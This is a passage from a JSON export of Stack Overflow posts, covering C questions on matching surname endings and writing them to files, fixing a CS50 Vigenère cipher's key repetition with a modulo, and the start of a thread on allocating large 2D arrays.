"https://stackoverflow.com/users/7928083/justin-j"}, "edited": false, "score": 0, "creation_date": 1498082201, "post_id": 44686850, "comment_id": 76357821, "body": "Try <code>strrstr</code> which searches from the end of the string, and compare the index returned with what you expect the index of the substring to be if it is the last n chars."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1498082834, "post_id": 44686850, "comment_id": 76358080, "body": "<code>fflush(stdin);</code> -&gt; undefined behaviour, the code can do anything it wants. Read the documentation of the functions you use. <code>arm, ita, esp == NULL</code> -&gt; does not make sense. <code>&amp;person.lastName</code> - wrong type. Etc. Fix the errors. Read a good C book, fixe the obvious issues. Enable and don&#39;t ignore compiler warnings!"}, {"owner": {"reputation": 43, "user_id": 8177560, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/88071f079ec53c17a245d7924cd5240f?s=128&d=identicon&r=PG&f=1", "display_name": "J. Rousselot", "link": "https://stackoverflow.com/users/8177560/j-rousselot"}, "reply_to_user": {"reputation": 386, "user_id": 7928083, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/usoNq.png?s=128&g=1", "display_name": "Justin J.", "link": "https://stackoverflow.com/users/7928083/justin-j"}, "edited": false, "score": 0, "creation_date": 1498083015, "post_id": 44686850, "comment_id": 76358146, "body": "O.K -- I looked into <code>strrstr</code> and understood how to possibly apply it into my code. However, it seems this is not included in the <code>&lt;string.h&gt;</code> library (I use Visual Studio if that helps) so I cannot implement it as it gives me an error of an &quot;unresolved external&quot;.  Is there an alternative way to include this function?  Thank you for the nudge in the right direction though @Justin"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 386, "user_id": 7928083, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/usoNq.png?s=128&g=1", "display_name": "Justin J.", "link": "https://stackoverflow.com/users/7928083/justin-j"}, "edited": false, "score": 2, "creation_date": 1498083127, "post_id": 44686850, "comment_id": 76358192, "body": "@JustinJ. There is no standard function <code>strrstr</code>."}, {"owner": {"reputation": 1439, "user_id": 5196093, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ovj7.png?s=128&g=1", "display_name": "Ray", "link": "https://stackoverflow.com/users/5196093/ray"}, "edited": false, "score": 0, "creation_date": 1498083458, "post_id": 44686850, "comment_id": 76358298, "body": "@J.Rousselot What book/site <i>are</i> you learning this from?  I&#39;m worried that it might be giving bad advice."}, {"owner": {"reputation": 43, "user_id": 8177560, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/88071f079ec53c17a245d7924cd5240f?s=128&d=identicon&r=PG&f=1", "display_name": "J. Rousselot", "link": "https://stackoverflow.com/users/8177560/j-rousselot"}, "reply_to_user": {"reputation": 1439, "user_id": 5196093, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ovj7.png?s=128&g=1", "display_name": "Ray", "link": "https://stackoverflow.com/users/5196093/ray"}, "edited": false, "score": 0, "creation_date": 1498083783, "post_id": 44686850, "comment_id": 76358400, "body": "@Ray -- Very scattered resources; spanning from simple google searches to random YouTube videos.   I figure getting the information from a singular source would be ideal. With that said, do you recommend anything for C?"}, {"owner": {"reputation": 1439, "user_id": 5196093, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ovj7.png?s=128&g=1", "display_name": "Ray", "link": "https://stackoverflow.com/users/5196093/ray"}, "edited": false, "score": 1, "creation_date": 1498084208, "post_id": 44686850, "comment_id": 76358555, "body": "@J.Rousselot <a href=\"https://en.wikipedia.org/wiki/The_C_Programming_Language\" rel=\"nofollow noreferrer\">Kernighan &amp; Ritchie&#39;s &quot;The C Programming Language&quot;, second edition (K&amp;R2)</a>.  It&#39;s an older book, covering the original C standard, so a few things have been changed since it was written, but most of those are additions.  The coding style is a bit out of fashion in a few places, as well.  But it&#39;s well written, and Ritchie is the guy who created C, so he actually knows what he&#39;s talking about.  It&#39;s a better reference manual than tutorial, but it&#39;s not <i>bad</i> as a tutorial."}], "answers": [{"comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1498082966, "post_id": 44687053, "comment_id": 76358131, "body": "&quot;This is meaningless.&quot; - No, it is very relevant, as it invokes undefined behaviour!"}, {"owner": {"reputation": 1439, "user_id": 5196093, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ovj7.png?s=128&g=1", "display_name": "Ray", "link": "https://stackoverflow.com/users/5196093/ray"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1498083333, "post_id": 44687053, "comment_id": 76358256, "body": "@Olaf I was glossing over that since the OP is a complete beginner, but you&#39;re right.  Best to be as clear as possible about how bad UB is.  I&#39;ve added some text to that effect."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1498083369, "post_id": 44687053, "comment_id": 76358266, "body": "What is &quot;UD&quot;? You mean UB?"}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1498083518, "post_id": 44687053, "comment_id": 76358319, "body": "See <a href=\"https://stackoverflow.com/questions/2979209/using-fflushstdin\">stackoverflow.com/questions/2979209/using-fflushstdin</a>. While <code>fflush(stdin)</code> is undefined by the C and POSIX standards, it&#39;s apparently defined by Windows. So it should be OK in any code that has hard-coded Windows pathnames."}, {"owner": {"reputation": 1439, "user_id": 5196093, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ovj7.png?s=128&g=1", "display_name": "Ray", "link": "https://stackoverflow.com/users/5196093/ray"}, "reply_to_user": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1498083868, "post_id": 44687053, "comment_id": 76358436, "body": "@Barmar But is the OP using it because they&#39;re explicitly invoking implementation-dependent extensions, or because they don&#39;t realize it&#39;s not part of the standard?  Best case, it&#39;s a bad habit that will need to be unlearned once they start writing portable code.  Worst case, they don&#39;t realize that it&#39;s undefined in general and end up unknowingly writing buggy code.  Best to keep the good habit of writing portable code whenever possible from the beginning."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1498086301, "post_id": 44687053, "comment_id": 76359162, "body": "@Ray Good point. It seems like one of those things students learn from coding templates, like <code>system(&quot;cls&quot;);</code>"}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 1, "creation_date": 1498091216, "post_id": 44687053, "comment_id": 76360375, "body": "<code>strstr</code> finds the first match, checking if it is at the end using the offset will produce false negatives as in <code>panini</code>.  A function such as Stephan Lechner&#39;s <code>strEndsWith</code> is a better solution."}, {"owner": {"reputation": 1439, "user_id": 5196093, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ovj7.png?s=128&g=1", "display_name": "Ray", "link": "https://stackoverflow.com/users/5196093/ray"}, "reply_to_user": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1498091778, "post_id": 44687053, "comment_id": 76360487, "body": "@chqrlie Good catch on strstr.  I&#39;ve removed the sentence that suggests otherwise.  No need to seek to the end though; the files are opened in &quot;w+&quot; mode, so they&#39;ll be truncated to 0 length before anything is written. And fwrite is an acceptable way to write strings; I&#39;d use fprintf myself, but that&#39;s just a matter of personal preference unless you&#39;re using something more involved than &quot;%s&quot; as your format string.  (Although they probably <i>do</i> want to add a newline or something between names.)"}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1498092528, "post_id": 44687053, "comment_id": 76360633, "body": "@Ray: You are correct about <code>&quot;w+&quot;</code>, I was thinking of <code>&quot;r+&quot;</code> for updating existing files. <code>&quot;wb&quot;</code> by the way is completely useless as the program never reads back from the files.  <code>&quot;wt&quot;</code> is actually meaningful on legacy platforms where it forces text mode to produce the silly <code>\\r\\n</code> newline sequences. The unexperienced OP writes: <i>Issue: Needs to be saved as Lastname, Firstname -- For now, it saves as LastnameFirstname.</i>  <code>fprintf()</code> is an obvious solution for his purpose. <code>fwrite</code> is not."}, {"owner": {"reputation": 43, "user_id": 8177560, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/88071f079ec53c17a245d7924cd5240f?s=128&d=identicon&r=PG&f=1", "display_name": "J. Rousselot", "link": "https://stackoverflow.com/users/8177560/j-rousselot"}, "edited": false, "score": 0, "creation_date": 1498093926, "post_id": 44687053, "comment_id": 76360956, "body": "Thank you so much! Got the program running flawlessly with everyone&#39;s input."}], "tags": [], "owner": {"reputation": 1439, "user_id": 5196093, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ovj7.png?s=128&g=1", "display_name": "Ray", "link": "https://stackoverflow.com/users/5196093/ray"}, "is_accepted": false, "score": 1, "last_activity_date": 1498091314, "last_edit_date": 1498091314, "creation_date": 1498082910, "answer_id": 44687053, "question_id": 44686850, "link": "https://stackoverflow.com/questions/44686850/how-to-store-strings-that-end-with-certain-characters/44687053#44687053", "title": "How to store strings that end with certain characters?", "body": "<p>There are a number of unrelated issues here.</p>\n\n<pre><code>arm = fopen(\"C:\\\\Programming\\\\ARMENIA.TXT\", \"wt\");\n</code></pre>\n\n<p>That should be \"w+\", not \"wt\". Same for the others.  Or just \"w\", unless you want to both read and write.</p>\n\n<pre><code>if (arm, ita, esp == NULL)\n</code></pre>\n\n<p>The comma operator evaluates its left operand and discards it, then evaluates its right operand and keeps that value.  So this is equivalent to <code>if (esp == NULL)</code></p>\n\n<pre><code>fflush(stdin);\n</code></pre>\n\n<p>This is meaningless. When printing, the system is allowed to buffer output and then print it all at once, which can speed things up.  <code>fflush</code> forces it to actually print anything that's currently in the buffer.  It's useful if, for example, you want to prompt the user for input and need to make sure the prompt shows up.</p>\n\n<p>As such, it only works on an output stream.  (This error is actually taught in some terrible references, so I suspect this one isn't your fault.  You should stop using whatever reference told you to do this.)</p>\n\n<p>Addendum: As Olaf points out in the comments, this invokes undefined behavior, which is a topic unto itself.  The short and imprecise version is that any undefined behavior creates bugs that are really hard to track down.</p>\n\n<pre><code>if (ret = strstr(person.lastName, ian)) \n</code></pre>\n\n<p>This tells you that ian is in person.lastName somewhere, but not that it's at the end.  For example, suppose the last name is \"ian in ez\".  It'll match all three of your conditions. As an aside, you don't need to store ian in a variable; you can just do <code>strstr(person.lastName, \"ian\")</code>.</p>\n"}, {"comments": [{"owner": {"reputation": 43, "user_id": 8177560, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/88071f079ec53c17a245d7924cd5240f?s=128&d=identicon&r=PG&f=1", "display_name": "J. Rousselot", "link": "https://stackoverflow.com/users/8177560/j-rousselot"}, "edited": false, "score": 0, "creation_date": 1498093895, "post_id": 44687250, "comment_id": 76360946, "body": "Thank you so much! Got the program running flawlessly with everyone&#39;s input."}, {"owner": {"reputation": 43, "user_id": 8177560, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/88071f079ec53c17a245d7924cd5240f?s=128&d=identicon&r=PG&f=1", "display_name": "J. Rousselot", "link": "https://stackoverflow.com/users/8177560/j-rousselot"}, "edited": false, "score": 0, "creation_date": 1498094793, "post_id": 44687250, "comment_id": 76361154, "body": "I&#39;m looking at this function a little sideways. If it&#39;s not too much to ask, could someone break down each segment into some sort of psuedo-code?"}], "tags": [], "owner": {"reputation": 33645, "user_id": 2630032, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/hQF09.jpg?s=128&g=1", "display_name": "Stephan Lechner", "link": "https://stackoverflow.com/users/2630032/stephan-lechner"}, "is_accepted": false, "score": 1, "last_activity_date": 1498084664, "last_edit_date": 1498084664, "creation_date": 1498084138, "answer_id": 44687250, "question_id": 44686850, "link": "https://stackoverflow.com/questions/44686850/how-to-store-strings-that-end-with-certain-characters/44687250#44687250", "title": "How to store strings that end with certain characters?", "body": "<p>In addition to the issues Ray pointed out, see the following simple code for a <code>strEndsWith</code>-function. Hope it helps.</p>\n\n<pre><code>int strEndsWith(const char* str, const char* ending) {\n    size_t strlenStr = strlen(str);\n    size_t strlenEnding = strlen(ending);\n    if (strlenStr &lt; strlenEnding)\n        return 0;\n\n    const char* strAtEnding = str + strlenStr - strlenEnding;\n\n    return (strcmp(strAtEnding, ending) == 0);\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 43, "user_id": 8177560, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/88071f079ec53c17a245d7924cd5240f?s=128&d=identicon&r=PG&f=1", "display_name": "J. Rousselot", "link": "https://stackoverflow.com/users/8177560/j-rousselot"}, "edited": false, "score": 0, "creation_date": 1498093903, "post_id": 44688333, "comment_id": 76360949, "body": "Thank you so much! Got the program running flawlessly with everyone&#39;s input."}], "tags": [], "owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "is_accepted": true, "score": 1, "last_activity_date": 1498094846, "last_edit_date": 1498094846, "creation_date": 1498092186, "answer_id": 44688333, "question_id": 44686850, "link": "https://stackoverflow.com/questions/44686850/how-to-store-strings-that-end-with-certain-characters/44688333#44688333", "title": "How to store strings that end with certain characters?", "body": "<p>Your program has multiple issues.</p>\n\n<p>Some of the have been addressed by Ray and Stephen Lechner, but here are some more:</p>\n\n<ul>\n<li><p>The reason for the crashes is you pass string to <code>fwrite</code> instead of <code>FILE*</code> stream pointers: <code>fwrite(person.lastName, 1, strlen(person.lastName), ini);</code> should be written:</p>\n\n<pre><code>fwrite(person.lastName, 1, strlen(person.lastName), ita);\n</code></pre>\n\n<p>This is an indication that you compile without proper warnings enabled. Let the compiler help avoid such silly mistakes with <code>-Wall</code> for <code>gcc</code> or <code>/W3</code> for <code>msvc</code>.</p></li>\n<li><p>Note also that you should use <code>fprintf</code> to properly format the output to your text files. For example:</p>\n\n<pre><code>if (strEndsWith(person.lastName, \"ian\")) {\n    fprintf(arm, \"%s, %s\\n\", person.lastName, person.firstName);\n}\n</code></pre></li>\n</ul>\n\n<p>Here is an improved version:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint strEndsWith(const char *str, const char *ending) {\n    size_t len1 = strlen(str);\n    size_t len2 = strlen(ending);\n    return len1 &gt;= len2 &amp;&amp; !strcmp(str + len1 - len2, ending);\n}\n\nint main(void) {\n    FILE *arm = fopen(\"C:\\\\Programming\\\\ARMENIA.TXT\", \"wt\");\n    FILE *ita = fopen(\"C:\\\\Programming\\\\ITALIA.TXT\", \"wt\");\n    FILE *esp = fopen(\"C:\\\\Programming\\\\ESPANIA.TXT\", \"wt\");\n\n    if (arm == NULL || ita == NULL || esp == NULL) {\n        printf(\"Error: The archives could not be created.\\n\");\n        return 1;\n    } else {\n        printf(\"Operation Successful: Archives created.\\n\\n\");\n    }\n\n    for (;;) {\n        char firstName[20];\n        char lastName[30];\n        char response;\n\n        printf(\"\\n\\nPlease input the first name: \");\n        if (scanf(\"%19s\", firstName) != 1)\n            break;\n        printf(\"Please input the last name: \");\n        if (scanf(\"%29s\", lastName) != 1)\n            break;\n\n        if (strEndsWith(lastName, \"ian\")) {  \n            fprintf(arm, \"%s, %s\\n\", lastName, firstName);\n        }\n        if (strEndsWith(lastName, \"ini\")) {  \n            fprintf(ita, \"%s, %s\\n\", lastName, firstName);\n        }\n        if (strEndsWith(lastName, \"ez\")) {  \n            fprintf(esp, \"%s, %s\\n\", lastName, firstName);\n        }\n\n        printf(\"\\n\\nWould you like to enter another person into the archive?: (y) or (n): \");\n        if (scanf(\" %c\", &amp;response) != 1 || response != 'y')\n            break;\n    }\n\n    printf(\"\\n\\nThe operation has finished.\\n\\n\");\n\n    fclose(arm);\n    fclose(ita);\n    fclose(esp);\n\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 43, "user_id": 8177560, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/88071f079ec53c17a245d7924cd5240f?s=128&d=identicon&r=PG&f=1", "display_name": "J. Rousselot", "link": "https://stackoverflow.com/users/8177560/j-rousselot"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 115, "favorite_count": 0, "accepted_answer_id": 44688333, "answer_count": 3, "score": 2, "last_activity_date": 1498094846, "creation_date": 1498081904, "last_edit_date": 1498090937, "question_id": 44686850, "link": "https://stackoverflow.com/questions/44686850/how-to-store-strings-that-end-with-certain-characters", "title": "How to store strings that end with certain characters?", "body": "<p>I want to create a program that opens and writes to 3 different text files, the names a user inputs.</p>\n\n<p>The condition would be that if last names end with certain characters, they would be saved to a specific text file.</p>\n\n<p>For example, if the user inputs a last name that ends with <code>ian</code> it should be saved to the <code>ARMENIA.TXT</code> folder.</p>\n\n<p>Here is my code and the issues I encounter with it:</p>\n\n<pre><code>struct names {\n    char firstName[20];\n    char lastName[30];\n} person;\n\nint main() {\n    FILE *arm, *ita, *esp;\n    char ian[] = \"ian\";\n    char ini[] = \"ini\";\n    char ez[] = \"ez\";\n    char response;\n    char *ret;\n\n    arm = fopen(\"C:\\\\Programming\\\\ARMENIA.TXT\", \"wt\");\n    ita = fopen(\"C:\\\\Programming\\\\ITALIA.TXT\", \"wt\");\n    esp = fopen(\"C:\\\\Programming\\\\ESPANIA.TXT\", \"wt\");\n\n    if (arm, ita, esp == NULL) {\n        printf(\"Error: The archives could not be created.\");\n        return 1;\n    } else {\n        printf(\"Operation Successful: Archives created.\\n\\n\");\n    }\n\n    do {\n        fflush(stdin);\n        printf(\"\\n\\nPlease input your first name: \");\n        scanf(\"%s\", &amp;person.firstName);\n        printf(\"Please input your last name: \");\n        scanf(\"%s\", &amp;person.lastName);\n\n        if (ret = strstr(person.lastName, ian)) {  \n            fwrite(person.lastName, 1, strlen(person.lastName), arm);\n            fwrite(person.firstName, 1, strlen(person.firstName), arm);\n        }\n\n        if (ret = strstr(person.lastName, ini)) { \n            fwrite(person.lastName, 1, strlen(person.lastName), ini);\n            fwrite(person.firstName, 1, strlen(person.firstName), ini);\n        }\n\n        if (ret = strstr(person.lastName, ez)) { \n            fwrite(person.lastName, 1, strlen(person.lastName), ez);\n            fwrite(person.firstName, 1, strlen(person.firstName), ez);\n        }\n\n        printf(\"\\n\\nWould you like to enter another person into the archive?: (y) or (n): \");\n        scanf(\" %c\", &amp;response);\n\n    } while (response == 'y');\n\n    printf(\"\\n\\nThe operation has finished.\\n\\n\");\n\n    fclose(arm);\n    fclose(ita);\n    fclose(esp);\n\n    return 0;\n}\n</code></pre>\n\n<p>Issue: Will save to folder if last name contains <code>ian</code> (or <code>ini</code> / <code>ez</code>) in ANY part of the last name. How do I make the condition only if it ENDS with these strings?</p>\n\n<p>Issue: Will crash if last name contains <code>ini</code> or <code>ez</code> -- basically, only first If statement works.</p>\n\n<p>Issue: Needs to be saved as Lastname, Firstname -- For now, it saves as LastnameFirstname.</p>\n"}, {"tags": ["c", "cs50", "vigenere"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1498078865, "post_id": 44686106, "comment_id": 76356480, "body": "What is <code>k</code> ? and <code>strlen(k + count)</code> definitely looks fishy."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1498078942, "post_id": 44686106, "comment_id": 76356516, "body": "Use the modulus operator on the key index, instead of this malarky. Such as <code>k[i % strlen(k)]</code> (for illustration purposes: do something more efficient)."}], "answers": [{"tags": [], "owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "is_accepted": true, "score": 2, "last_activity_date": 1498081121, "last_edit_date": 1498081121, "creation_date": 1498080301, "answer_id": 44686529, "question_id": 44686106, "link": "https://stackoverflow.com/questions/44686106/how-to-repeat-characters-in-array/44686529#44686529", "title": "How to repeat characters in array", "body": "<p>You should use the modulo operator to compute the offset into the key.</p>\n\n<p>Here is a modified version:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;cs50.h&gt;\n\nint main(int argc, string argv[]) {\n    if (argc != 2) {\n        printf(\"usage: ./vigenere k\\n\");\n        return 1;\n    }\n    string k = argv[1];\n    size_t klen = strlen(k);\n    if (klen == 0) {\n        fprintf(stderr, \"vigenere: key must not be empty\\n\");\n        return 1;\n    }\n\n    printf(\"plaintext: \");\n    string text = get_string();\n\n    printf(\"ciphertext: \");\n\n    for (size_t i = 0; text[i] != '\\0'; i++) {\n        int d = (unsigned char)k[i % klen];\n        if (d &gt;= 'A' &amp;&amp; d &lt;= 'Z') {\n            d -= 'A';\n        } else\n        if (d &gt;= 'a' &amp;&amp; d &lt;= 'z') {\n            d -= 'a';\n        } else {\n            d = 0;\n        }\n\n        int c = (unsigned char)text[i];\n        if (c &gt;= 'A' &amp;&amp; c &lt;= 'Z') {\n            c = 'A' + (c - 'A' + d) % 26;   \n        } else\n        if (c &gt;= 'a' &amp;&amp; c &lt;= 'z') {\n            c = 'a' + (c - 'a' + d) % 26;   \n        }\n        putchar(c);\n    }\n    putchar('\\n');\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 23, "user_id": 3482175, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6665f4885580b3a17a2dc8d7582828c8?s=128&d=identicon&r=PG&f=1", "display_name": "Alex Niculescu", "link": "https://stackoverflow.com/users/3482175/alex-niculescu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 101, "favorite_count": 0, "accepted_answer_id": 44686529, "answer_count": 1, "score": 2, "last_activity_date": 1498087220, "creation_date": 1498078481, "last_edit_date": 1498087220, "question_id": 44686106, "link": "https://stackoverflow.com/questions/44686106/how-to-repeat-characters-in-array", "title": "How to repeat characters in array", "body": "<p>I am trying to implement Vigenere's Cipher in C but the problem is that when I try to repeat the key used in the array it is in, it breaks after the 4th letter. So if the key is ABC and the plaintext is HELLO, it returns HFNLO instead of HFNLP. When I look at my code it logically makes sense but it seems to just not work. Can anybody see the problem?</p>\n\n<p>Here is the code:</p>\n\n<pre><code>int main(int argc, string argv[])\n{\n    if(argc != 2)\n    {\n        printf(\"usage: ./vigenere k\\n\");\n        return 1;\n    }\n    //asks for plain text\n    printf(\"plaintext: \");\n    string text = get_string();\n    string k = argv[1];\n    printf(\"ciphertext: \");\n\n    //checks to see if length of key is shorter than length of plaintext and duplicates it.\n    int count = 0;\n    while(strlen(k) &lt;= strlen(text))\n    {\n        k[strlen(k + count)] = k[count];\n        count++;\n    }\n\n    //changes key to be within 0 - 25 and encrypts plaintext\n    for(int i = 0; i &lt; strlen(text); i++)\n    {\n        if(k[i] &gt;= 'A' &amp;&amp; k[i] &lt;= 'Z')\n        {\n             k[i] = k[i] - 65;\n        }\n        else if (k[i] &gt;= 'a' &amp;&amp; k[i] &lt;= 'z')\n        {\n            k[i] = k[i] - 97;\n        }\n\n        //if statement for plaintext capital letters\n        if(text[i] &gt;= 'A' &amp;&amp; text[i] &lt;= 'Z')\n        {\n            text[i] = text[i] - 64;\n            text[i] = ((text[i] + k[i]) % 26) + 64;   \n        }\n        //if statement for plaintext lowercase letters\n        else if(text[i] &gt;= 'a' &amp;&amp; text[i] &lt;= 'z')\n        {\n             text[i] = text[i] - 96;\n             text[i] = ((text[i] + k[i]) % 26) + 96;   \n        }\n        //prints final cipher\n        printf(\"%c\", text[i]);\n    } \n    printf(\"\\n\");\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "arrays"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1498078091, "post_id": 44685986, "comment_id": 76356065, "body": "Not <i>all</i> of the memory available on your computer is available as a single allocatable chunk for your program."}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 2, "creation_date": 1498078099, "post_id": 44685986, "comment_id": 76356071, "body": "It&#39;s not RAM that matters here but virtual address space. On a 32 bit system, one cannot address more than 4GB of address space (less in practice due to reserved blocks, fragmentation etc)."}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1498078209, "post_id": 44685986, "comment_id": 76356135, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/3463207/how-big-can-a-malloc-be-in-c\">How big can a malloc be in C?</a>"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1498079957, "post_id": 44685986, "comment_id": 76356956, "body": "TGhere is no 2D array in your code. <code>int **</code> is not a 2D array, cannot represent one or point to one. If you want to use a 2D array, use a pointer to a 1D array."}, {"owner": {"reputation": 97, "user_id": 8196386, "user_type": "registered", "profile_image": "https://graph.facebook.com/10155757235758455/picture?type=large", "display_name": "Ash", "link": "https://stackoverflow.com/users/8196386/ash"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1498080010, "post_id": 44685986, "comment_id": 76356983, "body": "@EugeneSh. You are right. But what is the solution if you need to have large arrays in your program?"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1498080066, "post_id": 44685986, "comment_id": 76356998, "body": "&quot;However, it does not say what to do when you need large dynamic 2D arrays in your program.&quot; - Maybe because it is logical to have enough memory available and a platform supporting that much memory?"}, {"owner": {"reputation": 97, "user_id": 8196386, "user_type": "registered", "profile_image": "https://graph.facebook.com/10155757235758455/picture?type=large", "display_name": "Ash", "link": "https://stackoverflow.com/users/8196386/ash"}, "reply_to_user": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, 